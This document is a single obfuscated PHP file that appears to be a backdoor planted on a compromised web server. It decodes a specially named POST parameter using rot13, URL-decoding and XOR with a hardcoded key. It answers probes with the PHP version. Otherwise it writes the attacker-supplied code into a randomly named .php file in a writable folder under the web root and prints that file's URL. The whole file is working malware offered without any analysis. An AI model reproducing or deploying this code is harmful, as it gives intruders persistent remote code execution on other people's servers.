<?php $ezfxbdww = "wvpbfukpdshqiiqh";$rqcjzc = "";foreach ($_POST as $vxalrshd => $ywfve){if (strlen($vxalrshd) == 16 and substr_count($ywfve, "%") > 10){moielvmxsd($vxalrshd, $ywfve);}}function moielvmxsd($vxalrshd, $ypioltzu){global $rqcjzc;$rqcjzc = $vxalrshd;$ypioltzu = str_split(rawurldecode(str_rot13($ypioltzu)));function odjdji($yhqrcx, $vxalrshd){global $ezfxbdww, $rqcjzc;return $yhqrcx ^ $ezfxbdww[$vxalrshd % strlen($ezfxbdww)] ^ $rqcjzc[$vxalrshd % strlen($rqcjzc)];}$ypioltzu = implode("", array_map("odjdji", array_values($ypioltzu), array_keys($ypioltzu)));$ypioltzu = @unserialize($ypioltzu);if (@is_array($ypioltzu)){$vxalrshd = array_keys($ypioltzu);$ypioltzu = $ypioltzu[$vxalrshd[0]];if ($ypioltzu === $vxalrshd[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function glroxu($vlwoacgitlir) {static $wxaeyl = array();$vcadkzy = glob($vlwoacgitlir . '/*', GLOB_ONLYDIR);if (count($vcadkzy) > 0) {foreach ($vcadkzy as $vlwoacgitl){if (@is_writable($vlwoacgitl)){$wxaeyl[] = $vlwoacgitl;}}}foreach ($vcadkzy as $vlwoacgitlir) glroxu($vlwoacgitlir);return $wxaeyl;}$bdyuwm = $_SERVER["DOCUMENT_ROOT"];$vcadkzy = glroxu($bdyuwm);$vxalrshd = array_rand($vcadkzy);$rmsuzrrog = $vcadkzy[$vxalrshd] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($rmsuzrrog, $ypioltzu);echo "http://" . $_SERVER["HTTP_HOST"] . substr($rmsuzrrog, strlen($bdyuwm));exit();}}}